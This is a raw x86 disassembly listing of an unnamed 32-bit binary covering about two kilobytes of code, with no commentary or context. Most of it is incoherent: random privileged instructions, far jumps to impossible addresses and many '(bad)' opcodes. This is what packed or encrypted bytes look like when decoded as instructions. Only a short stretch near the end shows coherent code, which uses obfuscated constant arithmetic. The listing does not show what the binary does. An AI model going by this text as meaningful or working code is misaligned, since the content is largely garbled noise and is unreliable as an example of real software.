  4030b5:	fisttp DWORD PTR [edi]
  4030b7:	add    BYTE PTR [edi],dh
  4030b9:	push   ds
  4030ba:	sahf   
  4030bb:	mov    edx,0x55b9cadc
  4030c0:	aad    0x44
  4030c2:	jecxz  0x403138
  4030c4:	mov    edx,0x6a9803da
  4030c9:	out    dx,al
  4030ca:	xor    bl,dl
  4030cc:	scas   al,BYTE PTR es:[edi]
  4030cd:	sub    DWORD PTR [edx+0x4a418a71],ebx
  4030d3:	retf   0x2a7d
  4030d6:	xlat   BYTE PTR ds:[ebx]
  4030d7:	js     0x403062
  4030d9:	leave  
  4030da:	test   eax,0xa319e5ee
  4030df:	push   ss
  4030e0:	stos   BYTE PTR es:[edi],al
  4030e1:	jmp    0x403116
  4030e3:	pop    edx
  4030e4:	(bad)  
  4030e5:	sbb    BYTE PTR [edx+0x40],al
  4030e8:	jo     0x40315e
  4030ea:	cmp    al,0xb0
  4030ec:	push   esi
  4030ed:	pop    esi
  4030ee:	pop    ebp
  4030ef:	xor    cl,BYTE PTR [edx+0x51698cea]
  4030f5:	imul   eax,DWORD PTR [esi],0x5e
  4030f8:	xchg   esp,eax
  4030f9:	jno    0x403125
  4030fb:	in     eax,0xd5
  4030fd:	pop    ds
  4030fe:	js     0x4030a6
  403100:	mov    edx,0xc46cc889
  403105:	or     ch,BYTE PTR [edi+0x5fef5ba2]
  40310b:	pop    edi
  40310c:	and    BYTE PTR [esi+ebx*8-0x62],ch
  403110:	mov    ds:0x46991f34,eax
  403115:	in     eax,0x11
  403117:	mov    edi,0xf845e93c
  40311c:	and    edi,DWORD PTR [edx+0x66]
  40311f:	(bad)  
  403120:	retf   
  403121:	mov    bh,0x9
  403123:	pop    ss
  403124:	outs   dx,BYTE PTR ds:[esi]
  403125:	add    eax,edi
  403127:	stc    
  403128:	cdq    
  403129:	mov    ch,0x21
  40312b:	mov    WORD PTR [ebp-0x15],?
  40312e:	jo     0x403105
  403130:	mov    ds:0xb0e07c46,al
  403135:	jbe    0x4030f2
  403137:	inc    esp
  403138:	xor    BYTE PTR [edx-0x49],0xa
  40313c:	jp     0x4030f0
  40313e:	cmp    bh,BYTE PTR [edx-0xe]
  403141:	or     ah,dl
  403143:	cmp    eax,0x8466d3e4
  403148:	xor    bl,al
  40314a:	pusha  
  40314b:	dec    edi
  40314c:	inc    ebx
  40314d:	mov    esi,0xc8424e4
  403152:	jmp    0xcf41b8a3
  403157:	push   ss
  403158:	or     dh,al
  40315a:	rep ins DWORD PTR es:[edi],dx
  40315c:	dec    edi
  40315d:	inc    edx
  40315e:	call   0x71bf1014
  403163:	out    dx,al
  403164:	leave  
  403165:	jl     0x40316f
  403167:	inc    ebx
  403168:	push   ss
  403169:	imul   eax,DWORD PTR [esi],0xbf46745
  40316f:	lods   al,BYTE PTR ds:[esi]
  403170:	xor    BYTE PTR [ebx-0x3b37c70a],0x90
  403177:	pop    ebx
  403178:	cmp    eax,0x44e2a249
  40317d:	push   0x24
  40317f:	out    dx,eax
  403180:	rcr    DWORD PTR [ebx+0x6c],0x43
  403184:	sbb    BYTE PTR [esi],cl
  403186:	(bad)  
  403188:	mov    DWORD PTR [ebp+0x7beb2826],ecx
  40318e:	fwait
  40318f:	xchg   ebp,eax
  403190:	je     0x40315e
  403192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403193:	cmc    
  403194:	inc    esi
  403195:	hlt    
  403196:	sbb    BYTE PTR [eax+0x61900c9b],dh
  40319c:	mov    DWORD PTR [ebx+0x62],ebx
  40319f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031a0:	sti    
  4031a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031a2:	cmp    al,0x7d
  4031a4:	or     ebx,ebp
  4031a6:	enter  0x7e3d,0x8d
  4031aa:	adc    cl,BYTE PTR [ecx+0x64]
  4031ad:	out    dx,al
  4031ae:	lods   eax,DWORD PTR ds:[esi]
  4031af:	clc    
  4031b0:	scas   al,BYTE PTR es:[edi]
  4031b1:	push   di
  4031b3:	pop    ss
  4031b4:	mov    ds:0x5b5dfb5,eax
  4031b9:	push   esp
  4031ba:	mov    ds:0x324012cb,al
  4031bf:	test   BYTE PTR [ebx+0x58],0xd2
  4031c3:	jecxz  0x403191
  4031c5:	xchg   edi,eax
  4031c6:	or     DWORD PTR [ebx-0x54474992],ecx
  4031cc:	daa    
  4031cd:	sub    cl,BYTE PTR ds:0xe0c4f1f
  4031d3:	fincstp 
  4031d5:	inc    eax
  4031d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031d7:	(bad)  
  4031d8:	adc    eax,0xa27ec8e0
  4031dd:	out    0x42,eax
  4031df:	mov    edx,0x1814cb6
  4031e4:	mov    fs,WORD PTR [edx-0x60c5fd62]
  4031ea:	popf   
  4031eb:	xor    BYTE PTR ds:[ecx],dl
  4031ee:	in     al,dx
  4031ef:	in     eax,0xc
  4031f1:	(bad)  
  4031f2:	mov    ch,0x6b
  4031f4:	add    BYTE PTR [esi-0x76],ah
  4031f7:	lods   al,BYTE PTR ds:[esi]
  4031f8:	push   esi
  4031f9:	jge    0x40326d
  4031fb:	xchg   ebx,eax
  4031fc:	adc    al,0x4
  4031fe:	adc    esp,ebp
  403200:	jbe    0x4031ad
  403202:	adc    al,0x41
  403204:	sti    
  403205:	aaa    
  403206:	push   cs
  403207:	push   ebp
  403208:	iret   
  403209:	adc    DWORD PTR [ebx],edx
  40320b:	mov    dh,BYTE PTR [edi+ebp*4-0x4a]
  40320f:	std    
  403210:	mov    al,ds:0x24c52654
  403215:	sahf   
  403216:	out    0x84,al
  403218:	es inc ecx
  40321a:	rol    BYTE PTR [edx-0x377f5eb5],1
  403220:	bound  esp,QWORD PTR [ebx+0x5e]
  403223:	ins    DWORD PTR es:[edi],dx
  403224:	lods   al,BYTE PTR ds:[esi]
  403225:	xchg   ecx,eax
  403226:	mov    al,0xe6
  403228:	xor    dh,BYTE PTR [edx+0x126910cc]
  40322e:	lock ja 0x40323b
  403231:	mov    al,ds:0xab9cf891
  403236:	jge    0x40321a
  403238:	test   eax,0xb390a05d
  40323d:	loopne 0x403212
  40323f:	xchg   ebx,eax
  403240:	stc    
  403241:	inc    edx
  403242:	mov    BYTE PTR [eax],ah
  403244:	pop    esp
  403245:	test   BYTE PTR [esi+0x5c245883],cl
  40324b:	xor    eax,0x48cdf1aa
  403250:	in     eax,dx
  403251:	adc    DWORD PTR [edi+0x20],esi
  403254:	jo     0x403257
  403256:	mov    dh,0x94
  403258:	ficom  DWORD PTR [edx]
  40325a:	add    BYTE PTR [edx+0x6f],dh
  40325d:	scas   eax,DWORD PTR es:[edi]
  40325e:	mov    dh,0x5d
  403260:	fist   WORD PTR cs:[esp+eax*1]
  403264:	xchg   esi,eax
  403265:	xchg   edi,eax
  403266:	ins    BYTE PTR es:[edi],dx
  403267:	inc    ebp
  403268:	mov    esi,es
  40326a:	int    0x30
  40326c:	mov    edi,0x2b330a3c
  403271:	retf   0x144a
  403274:	add    DWORD PTR ds:0x787e9b12,esi
  40327a:	push   ds
  40327b:	xchg   ebx,eax
  40327c:	lds    edx,FWORD PTR [eax-0x758acef8]
  403282:	push   0xaacbb31e
  403287:	sub    al,0x3c
  403289:	scas   eax,DWORD PTR es:[edi]
  40328a:	adc    eax,0xdc7102a1
  40328f:	repnz fmul DWORD PTR [ecx-0x2fcdf603]
  403296:	and    DWORD PTR [ecx],0x51b3a993
  40329c:	cs xlat BYTE PTR gs:[ebx]
  40329f:	jecxz  0x40331e
  4032a1:	sti    
  4032a2:	cwde   
  4032a3:	nop
  4032a4:	test   al,0xa4
  4032a6:	xor    WORD PTR [edx+0x22c43137],dx
  4032ad:	push   esi
  4032ae:	pop    ebp
  4032af:	(bad)  
  4032b1:	add    esp,DWORD PTR [eax]
  4032b3:	repnz cmp BYTE PTR [ebp+0xce5e1ae],0x23
  4032bb:	jl     0x4032fd
  4032bd:	dec    edx
  4032be:	out    dx,al
  4032bf:	cmp    eax,0x29eb4b15
  4032c4:	or     bl,BYTE PTR [esp+ebp*8]
  4032c7:	(bad)  
  4032ca:	loop   0x4032b9
  4032cc:	in     eax,dx
  4032cd:	ja     0x4032b2
  4032cf:	adc    DWORD PTR [ebp-0x46c4aceb],edx
  4032d5:	mov    esp,0x2742ffd7
  4032da:	sbb    ebp,esi
  4032dc:	sahf   
  4032dd:	push   ebx
  4032de:	fucom  st(3)
  4032e0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4032e2:	in     eax,dx
  4032e3:	jmp    0x4032b4
  4032e5:	fwait
  4032e6:	push   ebx
  4032e7:	loopne 0x4032c6
  4032e9:	add    eax,0xf305cace
  4032ee:	daa    
  4032ef:	(bad)  
  4032f0:	xor    BYTE PTR [eax],bh
  4032f2:	xchg   DWORD PTR [ebp+0x37],ecx
  4032f5:	test   DWORD PTR [ebp+eax*1+0x37],edi
  4032f9:	jmp    0xde75ffae
  4032fe:	aam    0x6a
  403300:	js     0x403327
  403302:	add    al,0x3b
  403304:	rol    DWORD PTR [esi],1
  403306:	push   esp
  403307:	push   0xde5d85bb
  40330c:	inc    ebp
  40330d:	mov    gs,WORD PTR [esi+0x59]
  403310:	cmp    al,0x26
  403312:	fwait
  403313:	ins    BYTE PTR es:[edi],dx
  403314:	pop    ds
  403315:	adc    al,0x3d
  403317:	iret   
  403318:	push   0x86091ec
  40331d:	pushf  
  40331e:	test   eax,0x311a8782
  403323:	jmp    0xf89d:0x99314aa9
  40332a:	jle    0x403310
  40332c:	xchg   ebp,eax
  40332d:	rcl    ah,cl
  40332f:	mov    DWORD PTR [edx-0x6a7a1539],0xd8332bec
  403339:	ins    DWORD PTR es:[edi],dx
  40333a:	or     eax,0xd1290514
  40333f:	pop    ss
  403340:	popf   
  403341:	rcr    BYTE PTR [ebp+eiz*2-0x3b],cl
  403345:	popf   
  403346:	test   BYTE PTR [edi-0x67],bl
  403349:	pop    es
  40334a:	dec    edx
  40334b:	test   al,0xe1
  40334d:	sub    edx,eax
  40334f:	enter  0x9f5,0xe5
  403353:	and    DWORD PTR [edx-0x39],ebx
  403356:	(bad)
  40335a:	ja     0x40337a
  40335c:	xor    eax,0xe2e1acfb
  403361:	je     0x4032f9
  403363:	into   
  403364:	sub    DWORD PTR [edi-0x5c2ef711],0x243a4a6e
  40336e:	imul   si,WORD PTR [esi],0x17
  403372:	es sub eax,0x112a7416
  403378:	xor    DWORD PTR [ebp-0x7276a4c5],esp
  40337e:	repz add DWORD PTR [edi+0x62ce3e11],0x8073f335
  403389:	mov    ds:0x2045321f,al
  40338e:	cmp    esi,DWORD PTR [ebp+edx*1+0x32]
  403392:	mov    ah,0x3a
  403394:	xchg   ebx,eax
  403395:	xchg   esi,eax
  403396:	out    0x69,eax
  403398:	popf   
  403399:	mov    al,0xc2
  40339b:	fild   WORD PTR [ecx]
  40339d:	push   edx
  40339e:	xor    cl,BYTE PTR [eax+0xf]
  4033a1:	aam    0xf
  4033a3:	add    al,0x2
  4033a5:	ss inc ecx
  4033a7:	outs   dx,DWORD PTR ds:[esi]
  4033a8:	lds    ebp,FWORD PTR [edx+0x58ec7dbc]
  4033ae:	add    BYTE PTR [edi-0x3d],dh
  4033b1:	xlat   BYTE PTR ds:[ebx]
  4033b2:	cmp    BYTE PTR [ebx-0x789035ba],ah
  4033b8:	xchg   BYTE PTR [edi],dl
  4033ba:	rcl    ch,1
  4033bc:	inc    BYTE PTR [ecx+0x69]
  4033bf:	ds aad 0x62
  4033c2:	out    dx,al
  4033c3:	dec    ebp
  4033c4:	getsec 
  4033c6:	mov    ecx,0x2a2352c6
  4033cb:	sub    ch,dh
  4033cd:	jmp    0x40340a
  4033cf:	aam    0xad
  4033d1:	adc    BYTE PTR [edx-0x3fb311e8],dl
  4033d7:	mov    dl,BYTE PTR [esi-0x1c]
  4033da:	adc    al,0xd1
  4033dc:	push   esp
  4033dd:	mul    BYTE PTR ds:0xa183eae4
  4033e3:	and    eax,ebx
  4033e5:	ret    0xa0a7
  4033e8:	jo     0x403446
  4033ea:	sub    al,0xac
  4033ec:	mov    eax,ds:0xabeadce8
  4033f1:	xchg   ebx,eax
  4033f2:	scas   eax,DWORD PTR es:[edi]
  4033f3:	xlat   BYTE PTR ds:[ebx]
  4033f4:	lock mov cl,0x78
  4033f7:	inc    eax
  4033f8:	adc    al,ch
  4033fa:	shl    BYTE PTR [edi],cl
  4033fc:	pop    esi
  4033fd:	add    eax,0xf5f6e3ca
  403402:	mov    BYTE PTR [ebx],al
  403404:	cld    
  403405:	add    al,BYTE PTR [esi]
  403407:	les    esp,FWORD PTR [ebp-0x3ccc3ffc]
  40340d:	bound  edi,QWORD PTR [ebx+0x7d]
  403410:	mul    bh
  403412:	cmp    eax,0xd5f30147
  403417:	xchg   ebp,eax
  403418:	rol    edi,cl
  40341a:	add    ebp,DWORD PTR [esi]
  40341c:	sub    al,0xa
  40341e:	stos   DWORD PTR es:[edi],eax
  40341f:	ror    DWORD PTR gs:[ecx-0x36],0xc1
  403424:	sldt   WORD PTR fs:[esi-0xf]
  403429:	jne    0x403423
  40342b:	add    DWORD PTR [edi+0x56],0x2e
  40342f:	cld    
  403430:	inc    esp
  403431:	bound  edx,QWORD PTR [eax+ecx*4]
  403434:	out    0x10,eax
  403436:	sti    
  403437:	pushf  
  403438:	jb     0x4034b5
  40343a:	fimul  WORD PTR [eax]
  40343c:	push   cs
  40343d:	retf   0xbb4b
  403440:	nop
  403441:	or     al,0xee
  403443:	xchg   ecx,eax
  403444:	xchg   edx,eax
  403445:	sbb    al,0x51
  403447:	ja     0x4034c0
  403449:	mov    ah,0xa2
  40344b:	outs   dx,BYTE PTR ds:[esi]
  40344c:	adc    BYTE PTR [esi+edi*8],ch
  40344f:	adc    al,bl
  403451:	inc    eax
  403452:	jecxz  0x403489
  403454:	cmp    BYTE PTR ds:0x2e16bee5,ah
  40345a:	das    
  40345b:	sbb    DWORD PTR [eax],0x1adee349
  403461:	std    
  403462:	mov    bh,0xe5
  403464:	or     edi,0x11
  403467:	add    esi,DWORD PTR [ecx+edx*8-0x6a]
  40346b:	jne    0x4034e2
  40346d:	pop    ecx
  40346e:	mov    dh,0xeb
  403470:	push   0x8650b046
  403475:	adc    eax,DWORD PTR [edi]
  403477:	test   eax,0x8d83b588
  40347c:	daa    
  40347d:	out    dx,eax
  40347e:	mov    ds,WORD PTR [esi-0x2e]
  403481:	popf   
  403482:	pop    edi
  403483:	mov    WORD PTR [esi-0x56206c12],es
  403489:	jg     0x403463
  40348b:	xchg   edi,eax
  40348c:	loop   0x4034f5
  40348e:	loopne 0x4034cd
  403490:	bound  edx,QWORD PTR [eax]
  403492:	inc    eax
  403493:	xor    al,0x77
  403495:	scas   al,BYTE PTR es:[edi]
  403496:	in     eax,0x5f
  403498:	les    esi,FWORD PTR [ebp-0x70]
  40349b:	add    eax,0x51099a6e
  4034a0:	pushw  ss
  4034a2:	xor    bl,BYTE PTR [ecx-0xc]
  4034a5:	mov    bl,0x8c
  4034a7:	xor    al,0x29
  4034a9:	push   0xffffff97
  4034ab:	push   ss
  4034ac:	xor    ebx,esi
  4034ae:	or     al,0xfb
  4034b0:	mov    edx,0xbaf9cec2
  4034b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034b6:	sub    DWORD PTR [edi-0x34],eax
  4034b9:	mov    esi,0xf18c6dcb
  4034be:	pop    edx
  4034bf:	cmp    BYTE PTR [edi+0x60],bl
  4034c2:	popf   
  4034c3:	ror    DWORD PTR [edi+0x72ff5b2e],0xc7
  4034ca:	ja     0x40349a
  4034cc:	shr    DWORD PTR [edx+0x66],1
  4034cf:	and    al,0x86
  4034d1:	xchg   esp,eax
  4034d2:	push   ss
  4034d3:	js     0x403470
  4034d5:	push   0xd
  4034d7:	in     al,0x8
  4034d9:	inc    eax
  4034da:	xor    al,0x5
  4034dc:	in     al,dx
  4034dd:	mov    esi,0x2497a727
  4034e2:	lea    esi,[esi]
  4034e4:	add    BYTE PTR [ebx+0x70],al
  4034e7:	test   al,0xbd
  4034e9:	cmp    BYTE PTR [ebp+0x2c55585b],dl
  4034ef:	jmp    0x8ab4:0x21cf728c
  4034f6:	push   es
  4034f7:	sub    dh,BYTE PTR [eax-0xee4388]
  4034fd:	loop   0x4034ef
  4034ff:	loope  0x403541
  403501:	sub    eax,0x4eab9eb5
  403506:	add    eax,0xa7534b7e
  40350b:	push   ds
  40350c:	pop    es
  40350d:	inc    esi
  40350e:	adc    BYTE PTR [edx+0x64ec869d],dh
  403514:	mov    ds:0xba6a98f5,al
  403519:	dec    esp
  40351a:	cwde   
  40351b:	sbb    bh,BYTE PTR [esi+0x6c3260d7]
  403521:	jmp    0x4034b3
  403523:	pusha  
  403524:	push   esi
  403525:	ror    BYTE PTR [eax+0x63],0xcb
  403529:	jnp    0x403575
  40352b:	dec    edi
  40352c:	xor    ebp,DWORD PTR [eax+esi*1-0x713ca7be]
  403533:	das    
  403534:	cmp    bh,BYTE PTR [esi]
  403536:	leave  
  403537:	pop    esp
  403538:	js     0x40356d
  40353a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40353b:	xchg   ebp,eax
  40353c:	or     BYTE PTR [ebp-0x65],ch
  40353f:	mov    al,0x8f
  403541:	fs jae 0x4035b1
  403544:	mov    ecx,0x689e0827
  403549:	push   edx
  40354a:	sahf   
  40354b:	mov    dh,dh
  40354d:	cwde   
  40354e:	adc    eax,0xc061d025
  403553:	pop    ss
  403554:	adc    BYTE PTR [edi],al
  403556:	(bad)  
  403557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403558:	repnz sub BYTE PTR [ebx+0x265351c9],bl
  40355f:	cmp    ecx,DWORD PTR [eax+0x58]
  403562:	sahf   
  403563:	fwait
  403564:	adc    cl,BYTE PTR [ecx+ebx*8+0x78]
  403568:	mov    edx,0xd3c7218f
  40356d:	mov    al,ds:0xa56734c4
  403572:	stc    
  403573:	mov    WORD PTR [ebx],es
  403575:	xchg   ebx,eax
  403576:	icebp  
  403577:	dec    ebx
  403578:	inc    esp
  403579:	fnstcw WORD PTR [ebp-0x13024b6d]
  40357f:	pop    edi
  403580:	rcl    DWORD PTR [esi+0x7],1
  403583:	mov    dl,0x9e
  403585:	(bad)  
  403588:	xor    ebx,edx
  40358a:	(bad)  
  40358d:	mov    ah,BYTE PTR [ebx+0x7b]
  403590:	pop    ss
  403591:	push   ds
  403592:	xor    eax,0x6bcf89
  403597:	call   0x64dc:0xbfcc
  40359d:	jae    0x403587
  40359f:	popf   
  4035a0:	das    
  4035a1:	stos   DWORD PTR es:[edi],eax
  4035a2:	dec    esp
  4035a3:	xor    al,0x25
  4035a5:	dec    edx
  4035a6:	repz or al,0xd7
  4035a9:	inc    ebp
  4035aa:	adc    al,0xe5
  4035ac:	mov    ebp,0xb98ba21b
  4035b1:	cmc    
  4035b2:	push   es
  4035b3:	cmp    eax,0xf434dd22
  4035b8:	repz fild DWORD PTR [eax+0x49]
  4035bc:	jmp    0x57d4ddf3
  4035c1:	sub    eax,eax
  4035c3:	(bad)  
  4035c6:	xor    ebx,DWORD PTR [edi]
  4035c8:	fsub   DWORD PTR [ebx-0x370713b2]
  4035ce:	mov    al,0x46
  4035d0:	pop    edx
  4035d1:	rcr    ah,0x81
  4035d4:	push   ebp
  4035d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035d6:	pop    esi
  4035d7:	push   0x30
  4035d9:	and    bl,cl
  4035db:	adc    ebx,ecx
  4035dd:	inc    ch
  4035df:	xchg   DWORD PTR [edx],eax
  4035e1:	jb     0x4035b8
  4035e3:	pop    esp
  4035e4:	imul   eax,edx,0x32802f32
  4035ea:	push   ds
  4035eb:	or     DWORD PTR ds:0x7de5e02e,ebp
  4035f1:	inc    esp
  4035f2:	enter  0xe2c9,0x4f
  4035f6:	fcomp  st(6)
  4035f8:	sbb    ebx,0x6d382494
  4035fe:	scas   eax,DWORD PTR es:[edi]
  4035ff:	gs inc eax
  403601:	xchg   ebp,eax
  403602:	outs   dx,BYTE PTR ds:[esi]
  403603:	ror    BYTE PTR [esi],0xb5
  403606:	mov    fs,WORD PTR [edx+0x76429f68]
  40360c:	adc    eax,0xc19cc373
  403611:	xchg   ebp,eax
  403612:	jno    0x40361d
  403614:	jb     0x4035d1
  403616:	dec    ebx
  403617:	shl    BYTE PTR [ebp+edi*4+0x51],0xeb
  40361c:	xor    al,0x52
  40361e:	sbb    cl,BYTE PTR [edi+eiz*8]
  403621:	pop    edi
  403622:	pushf  
  403623:	das    
  403624:	cmp    ecx,DWORD PTR ds:0xeb0b407d
  40362a:	cmp    DWORD PTR [eax-0x18],edx
  40362d:	lds    edi,FWORD PTR [edx-0x44]
  403630:	cmp    al,0xb7
  403632:	pop    edx
  403633:	push   esi
  403634:	pop    ds
  403635:	xchg   ebp,eax
  403636:	xchg   edi,eax
  403637:	jnp    0x4035f5
  403639:	out    dx,eax
  40363a:	jbe    0x4035d8
  40363c:	sbb    eax,0x89981f77
  403641:	adc    al,BYTE PTR [edi+0x32fca1e1]
  403647:	cmp    al,0x81
  403649:	lahf   
  40364a:	mov    BYTE PTR [ebp-0x52],cl
  40364d:	mov    ds:0x8d94ff7,al
  403652:	xor    ah,BYTE PTR [ebp-0x1a407f01]
  403658:	pop    ebp
  403659:	ror    BYTE PTR [edi+0x16bb4cc],cl
  40365f:	fstp   TBYTE PTR [ecx+0x37c0a89a]
  403665:	inc    ch
  403667:	ret    
  403668:	lods   eax,DWORD PTR ds:[esi]
  403669:	retf   
  40366a:	adc    al,0xf8
  40366c:	or     al,BYTE PTR [eax-0x26]
  40366f:	pop    esp
  403670:	hlt    
  403671:	(bad)  
  403672:	xchg   esi,eax
  403673:	call   0x7bc9:0xdd80d4b1
  40367a:	mov    bh,0x9
  40367c:	scas   al,BYTE PTR es:[edi]
  40367d:	pop    esp
  40367e:	out    0x2a,al
  403680:	fcom   DWORD PTR [ebx+0x5c321b86]
  403686:	jl     0x4036aa
  403688:	mov    ah,0x50
  40368a:	repz add dh,BYTE PTR [esi+0x47]
  40368e:	ds repnz in al,0x92
  403692:	fwait
  403693:	rcr    bl,0x8d
  403696:	xchg   ebp,eax
  403697:	cmp    edx,DWORD PTR ds:0x9121b235
  40369d:	inc    esi
  40369e:	jp     0x40363b
  4036a0:	popf   
  4036a1:	hlt    
  4036a2:	jg     0x40364b
  4036a4:	mov    dl,0x2a
  4036a6:	cmp    dl,BYTE PTR [edi-0x68918325]
  4036ac:	xchg   edx,eax
  4036ad:	fstp   TBYTE PTR [ebp+0x7093d5f3]
  4036b3:	jo     0x403660
  4036b5:	push   es
  4036b6:	adc    esi,0xcd4953e7
  4036bc:	add    DWORD PTR [edx],esp
  4036be:	mov    esp,0xed834228
  4036c3:	add    DWORD PTR [edi+0x79],edi
  4036c6:	dec    edx
  4036c7:	pop    ds
  4036c8:	test   eax,0xe86ad10d
  4036cd:	cmp    eax,eax
  4036cf:	rcr    ebx,1
  4036d1:	outs   dx,BYTE PTR ds:[esi]
  4036d2:	gs pop ds
  4036d4:	repz sub ah,BYTE PTR [esi+ebp*4-0x43]
  4036d9:	mov    al,ds:0x633bee95
  4036de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036df:	fwait
  4036e0:	(bad)  
  4036e1:	sub    ebp,DWORD PTR [edi-0x29]
  4036e4:	mov    dh,0x33
  4036e6:	les    esp,FWORD PTR ds:0xd1db8ab3
  4036ec:	sti    
  4036ed:	imul   ebx,DWORD PTR [eax],0x78
  4036f0:	lock iret 
  4036f2:	loop   0x40367b
  4036f4:	in     al,0x33
  4036f6:	lods   eax,DWORD PTR ds:[esi]
  4036f7:	icebp  
  4036f8:	sub    esp,DWORD PTR [eax+0x1]
  4036fb:	or     BYTE PTR [edx],bl
  4036fd:	sbb    eax,0x10fadac6
  403702:	mov    ah,0x9a
  403704:	xlat   BYTE PTR ds:[ebx]
  403705:	scas   eax,DWORD PTR es:[edi]
  403706:	jae    0x403700
  403708:	das    
  403709:	cli    
  40370a:	imul   bl
  40370c:	add    DWORD PTR [esi+0x58],0xffffffb4
  403710:	in     eax,dx
  403711:	dec    ebx
  403712:	sahf   
  403713:	jns    0x403738
  403715:	adc    DWORD PTR [edx-0x282b51ff],eax
  40371b:	cs (bad) 
  40371d:	mov    esp,0x267c835f
  403722:	sub    cl,BYTE PTR [edi+0x49]
  403725:	pushf  
  403726:	(bad)  
  403727:	pop    esi
  403728:	pop    ebx
  403729:	fcomi  st,st(0)
  40372b:	js     0x4036ce
  40372d:	out    0x54,eax
  40372f:	sub    al,0xb9
  403731:	call   0x83cba2e
  403736:	or     DWORD PTR [ebx+ecx*4-0x3388969c],0xcf37399d
  403741:	stos   DWORD PTR es:[edi],eax
  403742:	ins    DWORD PTR es:[edi],dx
  403743:	imul   ebx,DWORD PTR [ecx-0x20],0x935ecc77
  40374a:	popa   
  40374b:	inc    edi
  40374c:	enter  0x578a,0x3d
  403750:	inc    esp
  403751:	adc    DWORD PTR [eax+0x39a8834],ecx
  403757:	repnz mov bh,0xe1
  40375a:	inc    ecx
  40375b:	and    BYTE PTR [ebp-0x26ad35fd],cl
  403761:	pop    esp
  403762:	ins    BYTE PTR es:[edi],dx
  403763:	mov    dl,0xef
  403765:	or     DWORD PTR [eax-0x3b],eax
  403768:	out    dx,eax
  403769:	or     eax,0x202481b7
  40376e:	fnstsw WORD PTR [edx-0x7e9e796e]
  403774:	push   ds
  403775:	mov    ds:0x9a568dcc,al
  40377a:	ins    BYTE PTR es:[edi],dx
  40377b:	xlat   BYTE PTR ds:[ebx]
  40377c:	fld    DWORD PTR [eax+ebx*4-0x6813aa4]
  403783:	cmp    al,0x70
  403785:	clc    
  403786:	ds fs test eax,0x24625124
  40378d:	aam    0xb9
  40378f:	jl     0x4037f3
  403791:	add    BYTE PTR [esi],bl
  403793:	lds    edi,FWORD PTR [eax-0x372765c7]
  403799:	fdivr  QWORD PTR [esi+0x38fbe356]
  40379f:	scas   al,BYTE PTR es:[edi]
  4037a0:	out    dx,eax
  4037a1:	pop    edx
  4037a2:	mov    bh,0x17
  4037a4:	dec    esi
  4037a5:	push   esi
  4037a6:	sub    bl,ch
  4037a8:	add    DWORD PTR [edx],ebp
  4037aa:	xor    BYTE PTR [edx],ch
  4037ac:	or     ch,dl
  4037ae:	mov    ebx,0xd7fbbf9e
  4037b3:	jbe    0x40378d
  4037b5:	pop    eax
  4037b6:	hlt    
  4037b7:	(bad)  
  4037b9:	mov    ah,0x4d
  4037bb:	(bad)  
  4037bd:	sub    al,0x71
  4037bf:	fist   DWORD PTR [edi+0x25]
  4037c2:	in     eax,0xd0
  4037c4:	retf   
  4037c5:	nop
  4037c6:	outs   dx,BYTE PTR ds:[esi]
  4037c7:	push   ebp
  4037c8:	jae    0x40377d
  4037ca:	mov    ds:0x3c63363,eax
  4037cf:	(bad)  
  4037d0:	mov    DWORD PTR [ebp-0x80],eax
  4037d3:	lea    eax,[ebp-0x80]
  4037d6:	push   eax
  4037d7:	mov    eax,DWORD PTR [ebp+0xc]
  4037da:	xor    eax,esi
  4037dc:	add    eax,edi
  4037de:	push   eax
  4037df:	mov    eax,ds:0x42830f
  4037e4:	push   0x428265
  4037e9:	push   DWORD PTR [eax]
  4037eb:	call   0x423688
  4037f0:	mov    ecx,DWORD PTR [ebp-0x10]
  4037f3:	mov    eax,DWORD PTR [ebp-0x14]
  4037f6:	mov    DWORD PTR [ebp-0x28],eax
  4037f9:	mov    DWORD PTR [ebp-0x20],0xf89c8533
  403800:	mov    edx,0xf89c85b1
  403805:	mov    DWORD PTR [ebp-0x20],edx
  403808:	lea    eax,[edx-0x1]
  40380b:	mov    DWORD PTR [ebp-0x20],eax
  40380e:	mov    DWORD PTR [ebp-0x8],edx
  403811:	mov    DWORD PTR [ebp-0x10],0xf89c85b2
  403818:	mov    edx,DWORD PTR [ebp-0x8]
  40381b:	xor    edx,esi
  40381d:	mov    ebx,0xffcd8f14
  403822:	sub    ebx,edx
  403824:	mov    DWORD PTR [ebp-0xc],ebx
  403827:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  40382e:	mov    edx,DWORD PTR [ebp-0x10]
  403831:	mov    DWORD PTR [ebp-0x24],ecx
  403834:	cmp    edx,eax
  403836:	je     0x4080be
  40383c:	mov    eax,DWORD PTR [ebp-0x8]
  40383f:	mov    edx,DWORD PTR [ebp-0x8]
  403842:	xor    eax,esi
  403844:	xor    edx,esi
  403846:	lea    ebx,[eax+edx*1+0x64e5d8]
  40384d:	mov    eax,DWORD PTR [ebp-0xc]
  403850:	xor    edx,edx
  403852:	div    ebx
  403854:	mov    eax,DWORD PTR [ebp-0x10]
  403857:	mov    ebx,DWORD PTR [ebp-0x8]
  40385a:	xor    eax,esi
  40385c:	xor    ebx,esi
  40385e:	jmp    0x405c1c
  403863:	mov    edi,0x41446183
  403868:	test   BYTE PTR [ebx-0x196ad685],cl
  40386e:	call   0x5fdd:0x67afcb12
  403875:	jp     0x4038f1
  403877:	fstp   QWORD PTR [edi+0x7a]
  40387a:	jp     0x40384a
  40387c:	pop    es
  40387d:	out    0xa0,al
  40387f:	mov    eax,0x42d19dea
  403884:	xchg   BYTE PTR [ebp-0x13],ch
  403887:	mov    eax,ds:0x6a63732
  40388c:	sar    DWORD PTR [edi+0x43a665bb],0x35
  403893:	jmp    0x4038a3
  403895:	and    DWORD PTR [ebx+edi*8+0x36],edx
  403899:	or     al,0xbc
  40389b:	call   0x6decf4b
  4038a0:	mov    ebx,0x1d701c7b
  4038a5:	inc    esi
  4038a6:	inc    ecx
  4038a7:	dec    edi
  4038a8:	and    BYTE PTR [ecx],cl
